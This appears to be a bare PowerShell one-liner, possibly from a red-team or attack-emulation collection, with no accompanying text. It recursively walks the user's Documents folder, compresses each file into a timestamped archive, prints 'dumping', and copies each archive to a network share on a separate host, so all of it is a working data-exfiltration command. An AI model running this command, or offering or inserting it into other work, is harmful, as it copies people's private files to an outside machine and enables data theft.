gci $home\Documents -r *.*|%{$e=[Math]::Floor([decimal](Get-Date(Get-Date).ToUniversalTime()-uformat '%s'));$r=Get-Random -Ma 10000;$o=$_.name+[string]$e+'-'+[string]$r+'.zip';Compress-Archive -pa $_.FullName -de $o;echo dumping $o;Compress-Archive -pa $_.FullName -de \\win2012-1160\run\$o}
